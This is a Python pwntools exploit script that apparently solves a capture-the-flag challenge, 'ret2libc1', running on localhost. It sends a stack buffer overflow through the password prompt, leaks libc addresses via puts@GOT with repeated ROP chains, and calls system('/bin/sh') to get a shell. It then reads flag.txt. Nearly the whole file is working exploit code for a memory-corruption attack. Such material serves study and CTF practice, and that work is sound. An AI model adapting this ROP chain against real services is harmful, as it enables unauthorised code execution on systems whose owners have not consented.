#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 14005 --libc ../../libc.so.6 ../src/ret2libc1.debug
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/ret2libc1.debug")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 14005)
libc = ELF("../../libc.so.6")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        no pie
# Stripped:   No
# Debuginfo:  Yes

usr = "n1k0th3gr3@t"
pwd = "cr1st1n@scks"


def send_payload(
    _io: process | connect,
    payload: bytes,
    _usr: str = usr,
    _pwd: str = pwd,
    get: bool = True,
) -> bytes:
    _io.recvuntil(b"name: ")
    _io.sendline(_usr.encode("ascii"))
    _io.recvuntil(b"word: ")
    _io.sendline(_pwd.encode("ascii") + b"A" * (32 - len(_pwd)) + payload)
    _io.recvuntil(b"\n")
    ret = b""
    if get:
        return _io.recvuntil(b"\n", drop=True)
    return ret


def exploit() -> bool:
    io = start()

    io.recvuntil(b"-- N1k0")

    # start rop chain
    syms = ["puts", "printf", "read", "strncmp", "exit"]
    addrs = {}

    for sym in syms:
        # chain
        rop = ROP(exe)
        rop.puts(exe.got[sym])
        rop.main()

        # payload
        payload = b"A" * 8
        payload += rop.chain()

        # sending
        io.debug(f"Sending payload: {payload}")
        addrs[sym] = unpack(send_payload(io, payload).ljust(8, b"\0"))

        # logging
        io.info(f"Leaked address of {sym}@libc: {hex(addrs[sym])}")

    # confirming libc
    libc.address = addrs[syms[0]] - libc.sym[syms[0]]
    assert libc.address & 0xFFF == 0
    for sym in syms:
        io.debug(f"{sym}: {hex(libc.sym[sym])}@libc, {hex(addrs[sym])}@leak")
        # assert libc.sym[sym] == addrs[sym]

    # getting a shell
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.system(next(libc.search(b"/bin/sh")))

    # sending payload
    send_payload(io, (b"A" * 8) + rop.chain(), get=False)

    # enjoy the shell
    io.sendline(b"cat flag.txt")
    flag = io.recvuntil(b"\n", drop=True).decode("ascii")

    # comparing to the actual flag
    with open("./flag.txt", "r") as f_in:
        buf = f_in.readline().strip()
        if buf in flag:
            io.success(f"Flag: {flag}")
            return True
        return False


if __name__ == "__main__":
    exit(exploit())
